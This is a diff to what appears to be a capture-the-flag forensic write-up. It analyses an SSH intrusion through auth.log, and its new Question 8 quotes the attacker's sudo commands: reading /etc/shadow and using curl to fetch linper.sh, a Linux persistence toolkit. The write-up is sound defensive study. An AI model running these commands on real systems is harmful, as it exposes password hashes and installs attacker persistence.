@@ -101,7 +101,7 @@ Thus, the session number assigned to the attacker's manual login is 37.
 > [!TIP]
 > Hint: The auth.log file tracks user and group modifications on the server. Look for keywords such as `useradd`, `usermod`, `groupadd`, and `sudo` to identify user additions and privilege escalations.
 
-Using the command grep useradd auth.log, we identified the creation of a new user account:
+Using the command `grep useradd auth.log`, we identified the creation of a new user account:
 ```bash
 Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
 ```
@@ -138,3 +138,16 @@ Based on these logs, session 37 was removed at `Mar 6 06:37:24`, indicating that
 
 **Answer**: 2024-03-06 06:37:24
 
+### Question 8: The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?
+> [!TIP]
+> Although auth.log is not typically used to track command executions like auditd, commands executed with sudo are logged in auth.log since the system needs to authenticate the account's privileges to grant root level permissions for that command. Search for the keyword "COMMAND" to find commands executed using sudo.
+
+To identify the command executed with `sudo`, we searched for the keyword "COMMAND" in auth.log. Using the command `grep "COMMAND" auth.log` reveals the entries below:
+
+```bash
+Mar  6 06:37:57 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
+```
+From these logs, the command executed by the attacker to download the script using sudo is `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`, which is part of the Linux persistence toolkit.
+
+**Answer**: /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
